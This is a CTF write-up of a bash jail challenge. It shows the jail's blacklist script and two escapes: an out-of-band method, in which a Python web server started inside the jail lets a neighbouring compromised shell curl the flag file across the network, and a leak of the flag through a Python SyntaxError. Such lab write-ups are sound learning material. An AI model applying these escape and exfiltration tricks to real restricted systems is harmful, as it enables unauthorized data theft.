# Eevee Jail - 3

Note: I didn't solve this one, but I learned something new, wanted to do the writeup either way. This challenge has 2 solutions

### 1'st Solution (Intended)

This one was also a Bash jail

{% tabs %}
{% tab title="jail-3.sh" %}
```bash
#!/bin/bash

echo "========================
=    Eevee's Jail 3    =
========================"

function blacklist {
	if [[ $1 == *[abcdfgijklquwxz'/''<''>''&''$']* ]]
	then
    		return 0
	fi

	return 1
}

while :
do
        read -p "[+] > " huh
	if blacklist "$huh"
	then
		echo -e '[!] Mission Failed'
	else
		output=`$huh < /dev/null` &>/dev/null
		echo "Command executed"
	fi
done 
```
{% endtab %}
{% endtabs %}

We have a lot of blacklisted characters:

```
a, b, c, d, f, g, i, j, k, l, q, u, w, x, z, ', /, <, >, &, $
```

And it directs our input from `/dev/null` to `/dev/null` ? Honestly, I don't even understand what's going on bruv.

```
output=`$huh < /dev/null` &>/dev/null
```

This is the key part actually, the challenge also came with a Docker setup file

{% tabs %}
{% tab title="docker-setup.txt" %}
1. sudo docker build --no-cache -t jail-3 .
2. sudo docker run --name eevee-jail-3 -p 9003:9003 --network custom-network -d jail-3
{% endtab %}
{% endtabs %}

It was on the same network as the previous Bash jail and the technique to use is an Out-Of-Band exfiltration

If we input any normal commands we get a "Mission  Failed" message but if we test it with `python3` we dont receive the message which means it executed. From here we host a Python webserver

```
❯ nc 157.180.92.15 9003

========================
=    Eevee's Jail 3    =
========================
[+] > python3 -m http.server 8888
python3 -m http.server 8888

```

And in the jail 2 challenge we enter `bash` and curl the flag with `1>&2` to redirect `stdout` to `stderr` because `stdout` was suppressed due to `/dev/null`

```
nc 157.180.92.15 9002
========================
=    Eevee's Jail 2    =
========================
[+] > bash
bash
bash: cannot set terminal process group (2978): Inappropriate ioctl for device
bash: no job control in this shell
eevee@ffe68f5882da:/jail-2$ curl http://eeve-jail-3:8000/flag.txt 1>&2
curl http://eeve-jail-3:8000/flag.txt 1>&2
bbctf{you really escape the prison this way huh?}
```

Flag: `bbctf{you really escape the prison this way huh?}`&#x20;

***

### 2'nd Solution (Unintended)

Now this was also a cool way. Because `stdout` was suppressed, we can leak the flag through `python3` but by using Python's SyntaxError message.

We use the `*` command which tries to execute the script in the cwd which is `flag.txt` but when Python finds that `flag.txt` is not a valid executable file it outputs the error line with the contents itself

```
[+] > python3 *
python3 *
  File "flag.txt", line 1
    bbctf{you really escape the prison this way huh?}
         ^
SyntaxError: invalid syntax
Command executed
[+] > 
```

Very cool stuff
